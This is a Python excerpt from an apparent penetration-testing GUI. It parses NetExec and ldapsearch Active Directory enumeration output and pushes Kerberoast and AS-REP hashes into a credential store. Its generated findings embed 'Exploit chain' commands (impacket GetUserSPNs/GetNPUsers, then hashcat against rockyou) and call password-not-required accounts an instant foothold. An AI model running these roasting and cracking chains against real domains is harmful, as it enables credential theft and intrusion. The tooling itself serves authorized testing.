        """NetExec `nxc ldap` output parser.

        nxc emits tab-aligned lines prefixed with:
            <PROTO>  <IP>  <PORT>  <HOSTNAME>  <payload>
        where `<payload>` is the interesting bit (status markers,
        bare samaccountname lines, group names with ' members: N'
        suffix, `$krb5tgs$`/`$krb5asrep$` hashes).

        Output is ORDER-SENSITIVE: the flags you pass on the CLI
        (`--users --groups --admin-count --trusted-for-delegation
        --password-not-required --kerberoasting --asreproast`)
        dictate which sections appear and in what order.  Users
        appear without a header immediately after the login banner;
        every other section is introduced by a `[+] Found N ...`
        marker that our state machine keys off.
        """
        import re
        from utils.run_id import new_run_id

        target = self._get_target() or "target"
        rid = new_run_id()

        # Strip the standard nxc protocol/host/port/hostname prefix
        # so we can walk a clean payload stream.
        _PROTO_PREFIX = re.compile(
            r"^\s*(?:LDAP|SMB|SMBv2|WINRM|WMI|MSSQL|FTP|SSH|RDP|VNC)"
            r"\s+\S+\s+\d+\s+\S+\s+")
        payload = []
        for _, raw in log:
            s = self._strip_ansi(raw).rstrip()
            payload.append(_PROTO_PREFIX.sub("", s))

        # Section markers.  Each switches the walker's state so the
        # next batch of bare-name lines lands in the right bucket.
        _SEC_ADMINCOUNT = re.compile(
            r"Found\s+\d+\s+users?\s+with\s+admincount", re.I)
        _SEC_DELEG = re.compile(
            r"Found\s+\d+\s+users?\s+with\s+Trusted\s+for\s+Delegation",
            re.I)
        _SEC_PWNOTREQ = re.compile(
            r"Found\s+\d+\s+users?\s+with\s+Password\s+Not\s+Required",
            re.I)
        _SEC_KERBEROAST = re.compile(
            r"Found\s+\d+\s+kerberoastable|kerberoast(?:ing)?\s+hashes?",
            re.I)
        _SEC_ASREP = re.compile(
            r"Found\s+\d+\s+asrep|Don'?t\s+Require\s+PreAuth",
            re.I)

        # nxc >= 1.x prints --users and --groups as space-aligned TABLES
        # (a dashed "-Username-" / "-Group-" header, then rows), not the
        # older bare-name / "name members: N" form.  These headers start
        # with "-", so they must be matched BEFORE the separator skip, and
        # they switch the walker into a table state so group rows are
        # parsed as groups (multi-word names intact) instead of leaking
        # their first token into the user bucket (which reported ~40 users
        # and 0 groups on a DC that has 4 users and ~50 groups).
        _TBL_USERS = re.compile(r"^-+\s*Username\b", re.I)
        _TBL_GROUPS = re.compile(r"^-+\s*Group\b", re.I)
        # A table row: "<name>  <big gap>  <numeric column>  <rest>".  The
        # non-greedy name keeps multi-word group names ("Print Operators",
        # "Domain Admins") whole up to the members-count column.
        _TBL_ROW = re.compile(r"^(.+?)\s{2,}\d+(?:\s|$)")

        # Bare samaccountname: alnum + underscore/dot/dash, optional
        # trailing $ (machine accounts).  First token only — group
        # lines have trailing text that we strip separately.
        _USERNAME_RE = re.compile(
            r"^[A-Za-z][A-Za-z0-9_.\-$]{0,63}$")
        _GROUP_MEMBERS_RE = re.compile(r"members?\s*:\s*\d+", re.I)

        users, groups = [], []
        admincount, delegation, pwd_not_req = [], [], []
        kerberoastable_hashes, asrep_hashes = [], []

        # Default state = "users": nxc dumps user enumeration first,
        # immediately after the login banner, with NO section header.
        state = "users"

        for line in payload:
            stripped = line.strip()
            if not stripped:
                continue

            # Section switches take precedence over content parsing.
            if _SEC_ADMINCOUNT.search(stripped):
                state = "admincount"; continue
            if _SEC_DELEG.search(stripped):
                state = "delegation"; continue
            if _SEC_PWNOTREQ.search(stripped):
                state = "pwnotreq"; continue
            if _SEC_KERBEROAST.search(stripped):
                state = "kerberoast"; continue
            if _SEC_ASREP.search(stripped):
                state = "asrep"; continue
            if _TBL_USERS.match(stripped):
                state = "usertable"; continue
            if _TBL_GROUPS.match(stripped):
                state = "grouptable"; continue

            # Login banner / status / separator — skip.
            if stripped.startswith(("[", "-", "*")):
                continue

            # Kerberos hashes land in their own buckets regardless
            # of state (nxc sometimes interleaves them with users).
            if "$krb5tgs$" in stripped:
                kerberoastable_hashes.append(stripped)
                continue
            if "$krb5asrep$" in stripped:
                asrep_hashes.append(stripped)
                continue

            # nxc table rows (space-aligned columns): the first column is
            # the group name / username; the trailing columns are metadata
            # we don't bucket.  Parsed by state so a group row never leaks
            # its first token into the user list.
            if state == "grouptable":
                m = _TBL_ROW.match(stripped)
                if m:
                    groups.append(m.group(1).strip())
                continue
            if state == "usertable":
                first = stripped.split()[0]
                if _USERNAME_RE.match(first):
                    users.append(first)
                continue

            # Groups: "Group Name                members: 5"
            if _GROUP_MEMBERS_RE.search(stripped):
                gname = _GROUP_MEMBERS_RE.sub("", stripped).strip()
                if gname:
                    groups.append(gname)
                    state = "groups"   # lock the next bare lines
                                       # as groups too (edge case)
                continue

            # Everything else: split on whitespace, first token is
            # the samaccountname, bucket by current state.
            first_tok = stripped.split()[0]
            if not _USERNAME_RE.match(first_tok):
                continue

            if state == "admincount":
                admincount.append(first_tok)
            elif state == "delegation":
                delegation.append(first_tok)
            elif state == "pwnotreq":
                pwd_not_req.append(first_tok)
            elif state == "groups":
                # Multi-word group name without an explicit
                # "members:" row — rare but seen on older DCs.
                groups.append(stripped)
            elif state in ("kerberoast", "asrep"):
                # The hash didn't match the $krb5*$ regex — nxc
                # sometimes emits the username the hash came from
                # on its own line first.  Bucket as user too.
                users.append(first_tok)
            else:
                users.append(first_tok)

        # Dedup preserving order.
        users           = list(dict.fromkeys(users))
        # Machine accounts (trailing $) are not regular user accounts —
        # they carry random 120-char passwords, so they're noise in the
        # user list and useless in any wordlist.  Split them out so the
        # "regular accounts" count/list stays honest (bloodhound and
        # ldapdomaindump exclude them too).
        machine_accts   = [u for u in users if u.endswith("$")]
        users           = [u for u in users if not u.endswith("$")]
        groups          = list(dict.fromkeys(groups))
        admincount      = list(dict.fromkeys(admincount))
        delegation      = list(dict.fromkeys(delegation))
        pwd_not_req     = list(dict.fromkeys(pwd_not_req))
        kerberoastable_hashes = list(dict.fromkeys(
            kerberoastable_hashes))
        asrep_hashes    = list(dict.fromkeys(asrep_hashes))

        # Remove duplicates across buckets — a user flagged admin-
        # count or delegation is ALSO a user, but we don't want to
        # count them twice in the summary.
        special = set(admincount) | set(delegation) | set(pwd_not_req)
        users = [u for u in users if u not in special]

        if not any([users, groups, admincount, delegation,
                    pwd_not_req, kerberoastable_hashes, asrep_hashes]):
            return False

        # Push discovered users (all buckets) to session.
        try:
            sess = self.app.session_manager.current
            if sess:
                all_users = list(dict.fromkeys(
                    users + admincount + delegation + pwd_not_req))
                if all_users:
                    sess.add_discovered_users(all_users[:300])
                if groups and hasattr(sess, "discovered_groups"):
                    for g in groups:
                        if g not in sess.discovered_groups:
                            sess.discovered_groups.append(g)
        except Exception as e:
            print(f"[HAWK] nxc-ldap session push failed: {e}")

        # Push kerberoast / AS-REP hashes to Credential Store
        # (AD RESULTS section) so CRACK buttons pick them up.
        try:
            sess = self.app.session_manager.current
            if sess:
                from utils.run_id import TOOL_RUN_CATEGORY
                from utils.session import Credential
                for h in kerberoastable_hashes:
                    # $krb5tgs$23$*user$DOMAIN$spn*$hash
                    m = re.match(r"\$krb5tgs\$\d+\$\*([^$*]+)", h)
                    uname = m.group(1) if m else "kerberoastable"
                    sess.add_credential(Credential(
                        host=target,
                        username=uname,
                        password="",
                        hash_val=h,
                        cred_type="kerberos-tgs",
                        services=["KERBEROS"],
                        source_phase="nxc_ldap --kerberoasting",
                        category=TOOL_RUN_CATEGORY,
                        linked_run_id=rid,
                        # Encrypted TGS — crack it first.
                        verified=False,
                    ))
                for h in asrep_hashes:
                    m = re.match(r"\$krb5asrep\$\d+\$([^@]+)", h)
                    uname = m.group(1) if m else "asrep-user"
                    sess.add_credential(Credential(
                        host=target,
                        username=uname,
                        password="",
                        hash_val=h,
                        cred_type="kerberos-asrep",
                        services=["KERBEROS"],
                        source_phase="nxc_ldap --asreproast",
                        category=TOOL_RUN_CATEGORY,
                        linked_run_id=rid,
                        # Encrypted AS-REP — crack it first.
                        verified=False,
                    ))
                if kerberoastable_hashes or asrep_hashes:
                    # sess.add_credential() only mutates the in-memory
                    # list: without this the roasted hashes are lost on
                    # exit and never show up in the store.
                    sess.save()
                    store = getattr(self.app, "cred_store", None)
                    if store:
                        store.refresh()
        except Exception as e:
            print(f"[HAWK] nxc-ldap cred push failed: {e}")

        # ── Build the Target Intel finding ─────────────────────────
        desc = [
            f"NETEXEC LDAP enumeration on {target}.",
            "",
            f"  Users discovered          : {len(users) + len(special)}",
            f"  Machine accounts          : {len(machine_accts)}",
            f"  Groups discovered         : {len(groups)}",
            f"  Admin-count=1 users       : {len(admincount)}",
            f"  Trusted-for-delegation    : {len(delegation)}",
            f"  Password-not-required     : {len(pwd_not_req)}",
            f"  Kerberoastable (TGS hash) : {len(kerberoastable_hashes)}",
            f"  AS-REP roastable (hash)   : {len(asrep_hashes)}",
        ]
        if admincount:
            desc += ["",
                     "Admin-count=1 users (high-value, often "
                     "over-privileged):"]
            for u in admincount[:20]:
                desc.append(f"  · {u}")
        if delegation:
            desc += ["",
                     "Trusted-for-Delegation (check Unconstrained "
                     "with bloodhound — TGT hijack path):"]
            for u in delegation[:20]:
                desc.append(f"  · {u}")
        if pwd_not_req:
            desc += ["",
                     "Password-not-required (instant foothold — "
                     "empty password logs in):"]
            for u in pwd_not_req[:20]:
                desc.append(f"  · {u}")
        # List the FULL enumeration in the (expandable) finding, not a
        # 20-line teaser: on a real DC the operator needs every account
        # and group name, and the Target Intel card scrolls.  Cap only to
        # avoid a pathological multi-thousand-entry dump; anything beyond
        # the cap still lives in the session (discovered_users/groups).
        _LIST_CAP = 200
        if users:
            shown = users[:_LIST_CAP]
            more = len(users) - len(shown)
            desc += ["", f"Users ({len(users)} regular accounts"
                         + (f", first {_LIST_CAP} shown" if more else "")
                         + "):"]
            for u in shown:
                desc.append(f"  · {u}")
            if more:
                desc.append(f"  ... (+{more} more in the session)")
        if groups:
            shown = groups[:_LIST_CAP]
            more = len(groups) - len(shown)
            desc += ["", f"Groups ({len(groups)}"
                         + (f", first {_LIST_CAP} shown" if more else "")
                         + "):"]
            for g in shown:
                desc.append(f"  · {g}")
            if more:
                desc.append(f"  ... (+{more} more in the session)")
        if kerberoastable_hashes or asrep_hashes:
            desc += ["",
                     "Kerberos hashes pushed to Credential Store "
                     "(AD RESULTS section) — use CRACK to run "
                     "hashcat -m 13100 / 18200 against them."]

        sev = ("critical"
               if (pwd_not_req or delegation or kerberoastable_hashes
                   or asrep_hashes) else
               "high" if admincount else
               "info")
        # Stable title (target only) so re-running nxc ldap UPDATES the
        # one finding with a run-count badge instead of spawning a new
        # finding whenever the user/group counts change.  The counts live
        # in the description; replace=True refreshes it to the latest run.
        self.app.after(0, lambda:
            self.app.target_intel.add_auto_finding(
                title=f"NXC LDAP — {target}",
                description="\n".join(desc),
                severity=sev, source=tool.name,
                linked_run_id=rid, replace=True))

        self.app.terminal.write(
            f"  [+] nxc ldap parsed — "
            f"{len(users) + len(special)} users, "
            f"{len(groups)} groups, "
            f"{len(admincount)} admincount, "
            f"{len(delegation)} deleg, "
            f"{len(pwd_not_req)} pwd-not-req, "
            f"{len(kerberoastable_hashes)} TGS, "
            f"{len(asrep_hashes)} AS-REP.",
            "success")
        return True

    def _parse_ldapsearch_to_intel(self, tool, log: list) -> bool:
        """Parse ldapsearch LDIF output into Target Intel findings.

        Handles two output shapes:
          A) Naming-context query  (-s base namingcontexts)
             → extract baseDN and push usage hints
          B) Subtree / object-class query  (-b 'DC=…' '(objectClass=…)')
             → extract users, groups, computers; flag kerberoastable /
               AS-REP-roastable accounts; push one summary finding + one
               per notable security issue
          C) Empty / error result
             → push a single explanation finding
        """
        import re
        if not hasattr(self.app, "target_intel"):
            return False
        target = self._get_target() or "target"

        # ── Collect all lines into a single text block ────────────────────
        full  = "\n".join(l for _lvl, l in log if isinstance(l, str))
        lines = [l for _lvl, l in log if isinstance(l, str)]

        # ── Case A: naming contexts ───────────────────────────────────────
        base_dns  = []
        result_rc = None
        for line in lines:
            m = re.match(r"\s*namingContexts\s*:\s*(\S.*)$", line, re.I)
            if m:
                dn = m.group(1).strip()
                if dn and dn not in base_dns:
                    base_dns.append(dn)
            m2 = re.match(r"\s*result\s*:\s*(\d+)\s*(.*)$", line, re.I)
            if m2:
                result_rc = (m2.group(1), m2.group(2).strip())

        if base_dns:
            dn = base_dns[0]
            # Persist baseDN in session for other tools to reuse
            try:
                sess = self.app.session_manager.current
                if sess and not getattr(sess, "ldap_base_dn", ""):
                    sess.ldap_base_dn = dn
            except Exception as e:
                print(f"[hawk] ldap base_dn persist: {e}")

            desc_lines = [
                f"namingContexts (baseDN) discovered: {dn}",
                "",
                "This is the root of the LDAP directory tree for the AD "
                "domain.  All users, groups and computers live below this DN.",
                "",
                "Follow-up queries (use in LDAPSEARCH → Authenticated mode):",
                f"  All users      : (objectClass=user)    → sAMAccountName mail",
                f"  All groups     : (objectClass=group)   → cn member",
                f"  All computers  : (objectClass=computer)→ dNSHostName",
                f"  Kerberoastable : (&(objectClass=user)(servicePrincipalName=*))",
                f"  AS-REP roast   : (&(objectClass=user)"
                f"(userAccountControl:1.2.840.113556.1.4.803:=4194304))",
                "",
                "If anonymous bind is restricted, re-run with credentials "
                "using the dialog's 'Authenticated' mode.",
            ]
            if len(base_dns) > 1:
                desc_lines.insert(1, f"Other contexts: {', '.join(base_dns[1:])}")
            self.app.target_intel.add_auto_finding(
                title=f"LDAP BaseDN — {dn}",
                description="\n".join(desc_lines),
                severity="info", source="ldapsearch")
            return True

        # ── Case C: explicit error / no data ─────────────────────────────
        if result_rc and result_rc[0] != "0":
            code, msg = result_rc
            _ERR = {
                "1":   "LDAP_OPERATIONS_ERROR",
                "7":   "LDAP_AUTH_METHOD_NOT_SUPPORTED",
                "8":   "LDAP_STRONG_AUTH_REQUIRED  — server requires LDAPS/TLS",
                "32":  "LDAP_NO_SUCH_OBJECT  — wrong Base DN",
                "49":  "LDAP_INVALID_CREDENTIALS  — wrong username or password",
                "50":  "LDAP_INSUFFICIENT_ACCESS  — user lacks read rights",
                "52e": "LDAP_INVALID_CREDENTIALS  (AD data 52e = wrong password)",
            }
            friendly = _ERR.get(code, msg or "unknown error")
            desc = (
                f"ldapsearch returned result code {code}: {friendly}\n\n"
                + {
                    "49":  "Wrong password or username. Re-run with correct credentials.",
                    "50":  "The bound user lacks LDAP read access — try a different account.",
                    "8":   "Server requires StartTLS or LDAPS. Use port 636 and add -Z flag.",
                    "32":  "Base DN not found. Check spelling — use Naming Contexts query first.",
                }.get(code,
                      "Verify that 389/tcp is reachable and the bind DN format is correct.")
            )
            self.app.target_intel.add_auto_finding(
                title=f"LDAP Error {code} — {friendly[:50]}",
                description=desc, severity="info", source="ldapsearch")
            return True

        # ── Case B: LDIF object records ───────────────────────────────────
        users    = []  # sAMAccountName strings
        groups   = []  # cn strings
        computers = []  # dNSHostName strings
        spn_users = []  # (sAMAccountName, [spns]) — kerberoastable
        asrep_users = []  # sAMAccountName — AS-REP roastable

        def _store(rec):
            """Classify one LDIF record.  objectClass is authoritative when
            present, but the preset queries usually DON'T request it (the
            "All Users" preset asks only for sAMAccountName/mail/displayName/
            memberOf), so fall back to the attributes we do have: a
            sAMAccountName ending in '$' (or a dNSHostName) is a computer,
            any other sAMAccountName is a user, a bare cn is a group.
            Without this fallback every preset that omitted objectClass
            parsed to zero objects and produced no finding at all."""
            if not rec:
                return
            sam = rec.get("samaccountname", "")
            ocs = rec.get("objectclass", [])
            if isinstance(ocs, str):
                ocs = [ocs]
            ocs_lo = [o.lower() for o in ocs]
            if ocs_lo:
                kind = ("computer" if "computer" in ocs_lo
                        else "group" if "group" in ocs_lo
                        else "user" if "user" in ocs_lo else "")
            elif sam.endswith("$") or rec.get("dnshostname"):
                kind = "computer"
            elif sam:
                kind = "user"
            elif rec.get("cn"):
                kind = "group"
            else:
                kind = ""

            if kind == "user" and sam:
                users.append(sam)
                spns = rec.get("serviceprincipalname", [])
                if isinstance(spns, str):
                    spns = [spns]
                if spns:
                    spn_users.append((sam, spns))
                # DONT_REQUIRE_PREAUTH = flag 0x400000 = 4194304
                uac = rec.get("useraccountcontrol", "")
                try:
                    if int(uac) & 0x400000:
                        asrep_users.append(sam)
                except (ValueError, TypeError):
                    pass
            elif kind == "group":
                cn = rec.get("cn", "") or sam
                if cn:
                    groups.append(cn)
            elif kind == "computer":
                host = rec.get("dnshostname", "") or sam
                if host:
                    computers.append(host)

        current: dict = {}
        for line in lines:
            line = line.strip()
            # LDIF records start with `dn:` and are separated by blank
            # lines; some servers print only a `# comment` between them, so
            # treat a fresh `dn:` as a record boundary too.
            if not line or line.lower().startswith("dn:"):
                _store(current)
                current = {}
                if not line:
                    continue
            if ":" in line:
                attr, _, val = line.partition(":")
                val = val.strip()
                attr_lo = attr.strip().lower()
                if attr_lo in ("objectclass", "serviceprincipalname"):
                    current.setdefault(attr_lo, [])
                    current[attr_lo].append(val)
                else:
                    current[attr_lo] = val
        _store(current)

        total = len(users) + len(groups) + len(computers)
        if total == 0:
            return False  # nothing useful extracted — fall through to generic

        # ── Main summary finding ──────────────────────────────────────────
        parts = []
        if users:
            parts.append(f"{len(users)} user(s)")
        if groups:
            parts.append(f"{len(groups)} group(s)")
        if computers:
            parts.append(f"{len(computers)} computer(s)")

        desc_lines = [
            f"LDAP enumeration returned {total} objects ({', '.join(parts)}).",
            "",
        ]
        if users:
            shown = users[:30]
            desc_lines += ["Users:"] + [f"  {u}" for u in shown]
            if len(users) > 30:
                desc_lines.append(f"  … and {len(users)-30} more")
            desc_lines.append("")
        if groups:
            shown = groups[:20]
            desc_lines += ["Groups:"] + [f"  {g}" for g in shown]
            if len(groups) > 20:
                desc_lines.append(f"  … and {len(groups)-20} more")
            desc_lines.append("")
        if computers:
            desc_lines += ["Computers:"] + [f"  {c}" for c in computers[:20]]
            desc_lines.append("")

        # Stable title (target only) + replace so a repeat ldapsearch
        # updates the one finding with a badge instead of stacking a new
        # "N objects" finding each time the object count changes.
        self.app.target_intel.add_auto_finding(
            title=f"LDAP Enumeration — {target}",
            description="\n".join(desc_lines).strip(),
            severity="info", source="ldapsearch", replace=True)

        # ── Security findings ─────────────────────────────────────────────
        if spn_users:
            spn_desc = [
                f"Kerberoastable accounts ({len(spn_users)} found):",
                "These accounts have Service Principal Names set — an attacker "
                "can request a TGS ticket for each SPN and crack the hash "
                "offline with hashcat/john without any extra privileges.",
                "",
                "Accounts:",
            ]
            for sam, spns in spn_users[:15]:
                spn_desc.append(f"  {sam}")
                for s in spns[:3]:
                    spn_desc.append(f"    SPN: {s}")
            spn_desc += [
                "",
                "Exploit chain:",
                "  impacket-GetUserSPNs -request -dc-ip TARGET DOMAIN/user:pass",
                "  hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt",
            ]
            self.app.target_intel.add_auto_finding(
                title=f"Kerberoastable Accounts — {len(spn_users)} found",
                description="\n".join(spn_desc),
                severity="high", source="ldapsearch")

        if asrep_users:
            asrep_desc = [
                f"AS-REP Roastable accounts ({len(asrep_users)} found):",
                "These accounts do not require Kerberos pre-authentication.  "
                "An attacker can request an AS-REP for each and crack the "
                "encrypted timestamp offline — no valid password needed.",
                "",
                "Accounts:",
            ] + [f"  {u}" for u in asrep_users[:15]] + [
                "",
                "Exploit chain:",
                "  impacket-GetNPUsers -no-pass -request -dc-ip TARGET "
                "DOMAIN/ -usersfile users.txt",
                "  hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt",
            ]
            self.app.target_intel.add_auto_finding(
                title=f"AS-REP Roastable Accounts — {len(asrep_users)} found",
                description="\n".join(asrep_desc),
                severity="high", source="ldapsearch")

        return True

